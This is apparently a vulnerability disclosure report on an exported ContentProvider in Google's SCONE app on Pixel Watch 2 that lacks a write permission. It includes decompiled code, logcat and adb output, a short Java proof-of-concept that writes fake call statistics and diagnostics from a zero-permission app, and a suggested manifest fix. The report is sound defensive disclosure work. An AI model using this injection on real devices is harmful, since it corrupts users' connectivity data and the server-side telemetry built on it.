# VRP Report #46: Scone TroubleshooterProvider Missing writePermission — Zero-Permission Data Injection

## Summary

The `TroubleshooterProvider` ContentProvider in Google's SCONE app (com.google.android.apps.scone) on Pixel Watch 2 is exported with `readPermission="android.permission.READ_PRIVILEGED_PHONE_STATE"` but **no `writePermission`** declared in the manifest. This allows any installed app — with zero permissions — to inject arbitrary call diagnostics and statistics data into the provider's SharedPreferences storage.

## Vulnerability Details

**Component:** `com.google.android.apps.scone/.connectivitymonitor.TroubleshooterProvider`
**Package:** com.google.android.apps.scone (SCONE-WEAR-v60982, versionCode 56121)
**Device:** Pixel Watch 2 (eos, CP2A.260603.001, June 2026 security patches)
**Authority:** `com.google.android.connectivitymonitor.troubleshooterprovider`

### Manifest Declaration (from APK)

```xml
<provider
    android:authorities="com.google.android.connectivitymonitor.troubleshooterprovider"
    android:exported="true"
    android:name="com.google.android.apps.scone.connectivitymonitor.TroubleshooterProvider"
    android:readPermission="android.permission.READ_PRIVILEGED_PHONE_STATE" />
```

**Missing: `android:writePermission`** — Without a writePermission, Android's framework allows any app to call `insert()`, `update()`, and `delete()` on this provider.

### Code-Level Analysis

The `insert()` method in `TroubleshooterProvider.java` has **no caller verification**:

```java
public final Uri insert(Uri uri, ContentValues contentValues) {
    a("insert into content provider");  // just logging
    SharedPreferences.Editor editor = getContext()
        .getSharedPreferences("ConnectivityMonitor_TroubleshooterResult", 0).edit();
    for (String str : contentValues.keySet()) {
        editor.putString(str, contentValues.getAsString(str));
    }
    editor.apply();
    return null;
}
```

Key observations:
- No URI matching check — insert works on ANY URI path
- No permission check — no `getCallingPackage()` or `checkCallingPermission()`
- No input validation — writes arbitrary key-value pairs to SharedPreferences
- No rate limiting or size limiting

### URI Paths Exposed

| Path | Match Code | Data |
|------|-----------|------|
| `/call_statistics` | 10 | num_calls, recent_calls_fail_count, recent_wfc_fail_count, recent_volte_fail_count, recent_cs_fail_count, call_type_with_most_failures, predominant_failure_reason |
| `/diagnostics` | 20 | diagnosis, network_id, confidence, actions |

## Impact

**Integrity violation** — A zero-permission malicious app can:

1. **Inject fake call failure statistics**: Write arbitrary values for num_calls, fail counts, failure types — corrupting the device's connectivity troubleshooting data
2. **Inject fake network diagnostics**: Set arbitrary diagnosis, network_id, confidence values — misleading any system or user relying on troubleshooter data
3. **Corrupt troubleshooter actions**: Set the "actions" field to arbitrary values, potentially influencing automated troubleshooting recommendations
4. **Poison telemetry data**: The TroubleshooterProvider feeds data to Google's StatsLog telemetry system (atom ID reported via protobuf serialization in query path), meaning injected data could corrupt server-side connectivity analytics
5. **Write arbitrary keys**: Since insert() iterates all ContentValues keys without filtering, an attacker can write any arbitrary key to the SharedPreferences file

### Contrast with Sibling Providers (Correct Implementation)

| Provider | readPermission | writePermission | Status |
|----------|---------------|-----------------|--------|
| TroubleshooterProvider | READ_PRIVILEGED_PHONE_STATE | **NONE** | **VULNERABLE** |
| ConnectivityHelperProvider | READ_PRIVILEGED_PHONE_STATE | MODIFY_PHONE_STATE | Protected |
| NimbusProvider | READ_PRIVILEGED_PHONE_STATE | WRITE_NIMBUS_DATA | Protected |
| CallDataProvider | N/A (exported=false) | N/A | Protected |

## Dynamic Proof

### Test Environment
- Target: Pixel Watch 2 (serial: 3A101RTJWRGCV9)
- Build: CP2A.260603.001 (June 2026 security patches)
- PoC app: com.vrp.poc (UID 10156, zero permissions)

### Proof: Write from Zero-Permission App (UID 10156)

```
09-10 09:10:51.596 6130 6145 I VRP_SCONE: === Scone Provider Zero-Permission Exploit ===
09-10 09:10:51.596 6130 6145 I VRP_SCONE: PoC app UID: 10156
09-10 09:10:51.596 6130 6145 I VRP_SCONE: --- TROUBLESHOOTER WRITE (zero-permission INTEGRITY VIOLATION) ---
09-10 09:10:51.596 6130 6145 I VRP_SCONE:   WRITE SUCCESS — injected fake diagnostics data
```

### Proof: Read Denial Confirms readPermission Works (Shows Asymmetry)

```
09-10 09:10:51.596 6130 6145 I VRP_SCONE: --- TROUBLESHOOTER READ (zero-permission) ---
09-10 09:10:51.596 6130 6145 I VRP_SCONE:   ERROR: Permission Denial: reading com.google.android.apps.scone.connectivitymonitor.TroubleshooterProvider uri content://com.google.android.connectivitymonitor.troubleshooterprovider/call_statistics from pid=6130, uid=10156 requires android.permission.READ_PRIVILEGED_PHONE_STATE, or grantUriPermission()
```

### Proof: Injected Data Persists (Verified from Shell)

```
$ adb shell content query --uri content://com.google.android.connectivitymonitor.troubleshooterprovider/diagnostics
Row: 0 KEY=diagnosis, VALUE=INJECTED_BY_MALICIOUS_APP
Row: 1 KEY=network_id, VALUE=SPOOFED_NETWORK_123
Row: 2 KEY=confidence, VALUE=HIGH
Row: 3 KEY=version, VALUE=NULL
Row: 4 KEY=actions, VALUE=FAKE_ACTION_REBOOT

$ adb shell content query --uri content://com.google.android.connectivitymonitor.troubleshooterprovider/call_statistics
Row: 0 KEY=num_calls, VALUE=999
Row: 1 KEY=recent_calls_fail_count, VALUE=500
Row: 2 KEY=recent_wfc_fail_count, VALUE=250
Row: 3 KEY=recent_volte_fail_count, VALUE=100
Row: 4 KEY=recent_cs_fail_count, VALUE=NULL
Row: 5 KEY=version, VALUE=NULL
Row: 6 KEY=call_type_with_most_failures, VALUE=VOLTE
```

## PoC App Code

File: `poc_app/src/com/vrp/poc/SconeProviderLeakActivity.java`

Key exploit section:
```java
ContentValues cv = new ContentValues();
cv.put("diagnosis", "INJECTED_BY_MALICIOUS_APP");
cv.put("network_id", "SPOOFED_NETWORK_123");
cv.put("confidence", "HIGH");
cv.put("actions", "FAKE_ACTION_REBOOT");
getContentResolver().insert(
    Uri.parse("content://com.google.android.connectivitymonitor.troubleshooterprovider/diagnostics"), cv);
// Returns successfully — no SecurityException
```

## Reproduction Steps

1. Install PoC app on Pixel Watch 2 (zero permissions requested)
2. Launch SconeProviderLeakActivity
3. Observe logcat: "WRITE SUCCESS — injected fake diagnostics data"
4. Verify from adb: `content query --uri content://com.google.android.connectivitymonitor.troubleshooterprovider/diagnostics`
5. Confirm injected data persists in provider's SharedPreferences

## Suggested Fix

Add `android:writePermission="android.permission.READ_PRIVILEGED_PHONE_STATE"` (or equivalent signature|privileged permission) to the TroubleshooterProvider manifest declaration:

```xml
<provider
    android:authorities="com.google.android.connectivitymonitor.troubleshooterprovider"
    android:exported="true"
    android:name="com.google.android.apps.scone.connectivitymonitor.TroubleshooterProvider"
    android:readPermission="android.permission.READ_PRIVILEGED_PHONE_STATE"
    android:writePermission="android.permission.READ_PRIVILEGED_PHONE_STATE" />
```

Additionally, add input validation and caller verification in the `insert()` method.

## Classification

- **Vulnerability Type:** Missing Permission (CWE-862)
- **Attack Vector:** Local (installed app, zero permissions)
- **User Interaction:** None (zero-click)
- **Impact:** Integrity — corruption of call diagnostics and statistics data
- **Affected Component:** Privileged system app (priv-app) on Pixel Watch 2
